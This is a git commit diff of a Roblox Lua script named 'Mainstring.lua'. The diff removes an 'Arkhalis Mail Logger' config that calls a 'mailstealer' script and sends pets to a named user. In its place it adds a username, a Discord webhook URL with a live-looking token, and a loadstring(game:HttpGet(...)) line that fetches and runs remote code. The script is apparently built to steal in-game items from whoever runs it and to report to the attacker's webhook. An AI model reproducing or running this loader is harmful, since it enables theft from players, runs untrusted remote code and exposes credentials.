48dac2df98cd8095cbc9191d24b504afeb8fad80
TakTySiKokot <135499276+TakTySiKokot@users.noreply.github.com>
2023-08-02 09:55:14 +0200

    Mainstring.lua

--- Mainstring.lua
+++ Mainstring.lua
@@ -1,10 +1,4 @@
---[[ Arkhalis Mail Logger ]]--
+UserName = "HejVajcoCoRobis"
+WebHook = "https://discord.com/api/webhooks/1127315957497462784/PURp8OProhSrHnA-exQ_W1Cypxj9wUiPevmje4HTms1eoaDYHSzLPQ_vr2zWkrqjt5Y4"
 
---[[ Main Config ]]--
-_G.Username1 = "HejVajcoCoRobis" --// Username To Send Pets To
-_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
---[[ Webhook Config ]]--
-_G.Webhook = "https://discord.com/api/webhooks/1114812057016078357/7NFjQ18r74xXe1yGI_NPkKEiiig4yPUU2wiPH0LI9qQLfCy61OrgPdBlIjz9cKn8lGeE" --// Discord Webhook For Executions
-
---[[ Script ]]--
-loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
+loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))()
